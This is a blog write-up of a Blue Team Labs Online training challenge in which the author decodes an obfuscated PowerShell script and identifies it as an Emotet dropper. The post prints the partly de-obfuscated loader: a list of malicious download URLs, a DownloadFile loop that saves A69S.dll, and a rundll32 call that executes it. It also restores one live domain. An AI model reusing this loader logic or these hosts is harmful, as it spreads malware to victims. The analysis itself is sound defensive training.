---
title: "Malicious PowerShell Analysis BTLO "
date: 2021-10-09T17:30:30
categories:
  - challenge
tags:
  - Blue Team Labs Online
  - Forensics
  - Incident Response
classes: wide
---
Continuing the skill-set diversification, a medium rated retired incident response challenge from [Blue Team Labs Online.](https://blueteamlabs.online/home/challenge/7)

>*"Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. The damage caused was critical and resulted in business-wide disruption. GothamLegend had to reach out to a third-party incident response team to assist with the investigation. You are a member of the IR team - all you have is an encoded Powershell script. Can you decode it and identify what malware is responsible for this attack?*"

The challenge has guided questions to answer to obtain points.

---

First we unzip the challenge:

<img src="/assets/images/malpowerbtlo/mal1.PNG" alt="Unzipping the file.">

Then have a look at the contents, `BTLO.txt` contains information about the challenge source and requests to not distribute. 

Next we look at the actual challenge log `ps_script.txt`:

<img src="/assets/images/malpowerbtlo/mal2.PNG" alt="Looking at the contents.">

Welp.

<h4>De-obfuscation</h4>

It appears to be obfuscated powershell. According to [malware.news](https://malware.news/t/deobfuscating-powershell-putting-the-toothpaste-back-in-the-tube/23509):

>*"PowerShell commands can be logged and script files can be captured for analysis. This gives us a chance to perform after-action forensics to see what the attacker was up to and if they were successful. Unfortunately, attackers don’t like making this easy, so they will often obfuscate and encode commands to deter and slow down analysts."*

The opening line of the `ps_script.txt` log shows:

```powershell
POwersheLL  -w hidden -ENCOD
```
It seems powershell is case-insensitive, and autocompletes flags. 

These commands show that the powershell window was hidden with `-w hidden` and then its commands were encoded into base64 with `-ENCOD` which is encode. 

We throw the output of the `.txt` file into GCHQ's CyberChef and convert from base64:

<img src="/assets/images/malpowerbtlo/mal3.PNG" alt="Converting from base64.">

It still looks pretty difficult to read, searching around the web suggests that we try and remove null bytes from the output like so:

<img src="/assets/images/malpowerbtlo/mal4.PNG" alt="Removing null bytes.">

After removing null bytes these commands are still hard to read, more research suggests the use of CyberChef's `Generic Code Beautify`. From here we try to remove as much as we can through `find/replace` like so:

<img src="/assets/images/malpowerbtlo/mal5.PNG" alt="Using Find/replace to remove seemingly useless items.">

The final result is shown below:

```powershell
sEtMKu[TYPe]01243-FSYsTeMioDIORYrECt;
SeT-iTEMvaRIabLEmBu[TYPe]680345271-fSteMGerManetseRVIcepOintsNAY;
$ErrorActionPreference=SilentlyContinue;
$Cvmmq4o=$Q26L[char]64$E16H;
$J16J=N_0P;
DIrVariabLEMkuVaLUecREAtedIRECTORy$HOME0Db_bh300Yf5be5g0-F[chAR]92;
$C39Y=U68S;
vARiaBLembu-VAlueoNsEcuRITYproTocol=Tls12;
$F35I=I4_B;
$Swrp6tc=A69S;
$X27H=C33O;
$Imd1yck=$HOMEUOHDb_bh30UOHYf5be5gUOHRePlACeUOH[StrInG][chAr]92$Swrp6tcdll;
$K47V=R49G;
$B9fhbyv=]anw[3s//admintkcom/wp-admin/L/@]anw[3s//mikegeerinckcom/c/YYsa/@]anw[3//freelancerwebdesignerhyderabadcom/cgi-bin/S/@]anw[3//etdogcom/wp-content/nu/@]anw[3s//wwwhintupcombr/wp-content/dE/@]anw[3//wwwstmarounsnsweduau/paypal/b8G/@]anw[3//wmmcdevelopnet/content/6F2gd/REplACe]anw[3[array]sdswhttp3d[1]sPLIT$C83R$Cvmmq4o$F10Q;
$Q52M=P05K;
foreach$Bm5pw6zin$B9fhbyv
try
&New-ObjectSysTemnEtWEBcLIeNTdoWNlOaDFIlE$Bm5pw6z$Imd1yck;
$Z10L=A92Q;
If&Get-Item$Imd1ycklenGTH-ge35698
&rundll32$Imd1yckControl_RunDLLTOStRiNG;
$R65I=Z09B;
break;
$K7_H=F12U

catch

$W54I=V95O
```

Now lets try and answer the questions!

<h4>What security protocol is being used for the communication with a malicious domain? </h4>

`sEcuRITYproTocol=Tls12` means TLS 1.2.

<h4>What directory does the obfuscated PowerShell create? (Starting from \HOME\)</h4>

This took be quite a bit to figure out, but reading the line where HOME is present made it clearer:

`$Imd1yck=$HOMEUOHDb_bh30UOHYf5be5gUOHRePlACeUOH[StrInG][chAr]92`

We see `replace uoh [string][char]92`. Looking at char 92 in an ASCII table:

<img src="/assets/images/malpowerbtlo/mal6.PNG" alt="92 = \.">

So we can read `$HOMEUOHDb_bh30UOHYf5be5gUOH` as `\HOME\Db_bh30\Yf5be5g\`. 

<h4>What file is being downloaded (full name)?</h4>

Looking back at our HOME line we see: 

`$HOMEUOHDb_bh30UOHYf5be5gUOHRePlACeUOH[StrInG][chAr]92$Swrp6tcdll;`

Since we now know that the directory the script creates is `\HOME\Db_bh30\Yf5be5g\` anything after `[StrInG][chAr]92` should be our downloaded file. 

Thus `$Swrp6tcdll` is the downloaded file, dll seems to be the file extension. We can try `Swrp6tc.dll`. 

However this is not correct. If we search for other references to `Swrp6tc` in the logs we find `$Swrp6tc=A69S;`, `$Swrp6tc` is a variable! This should have been obvious from the `$` sign in front of it. 

We instead try `A69S.dll` which is correct!

<h4>What is used to execute the downloaded file?</h4>

Now that we know it is a dll file, we see `&rundll32$Imd1yckControl_RunDLLTOStRiNG;` and see if `rundll32` is the `.exe` used to execute the file. 

It is correct!

<h4>What is the domain name of the URI ending in ‘/6F2gd/’</h4>

Searching through our logs we see the line `wmmcdevelopnet/content/6F2gd`. The URI doesn't make much sense without the `.` which we removed earlier through find/replace. 

Heading back to CyberChef to add them back in we see: `wm.mcdevelop.net/content/6F2gd` meaning the answer is `wm.mcdevelop.net`.

<h4>Based on the analysis of the obfuscated code, what is the name of the malware?</h4>

Googling around for the `A69S.dll` we come across MalwarebBazaar's [database](https://bazaar.abuse.ch/sample/23be1cb22c94fe77cea5f8e7fef6710eeef5a23e7e7eb9b9dd53f56d1b954269/) which suggests that the malware name is `Emotet (aka Heodo)`. We try Emotet and are rewarded with challenge complete!

<img src="/assets/images/malpowerbtlo/mal7.PNG" alt="https://blueteamlabs.online/achievement/share/challenge/14446/7">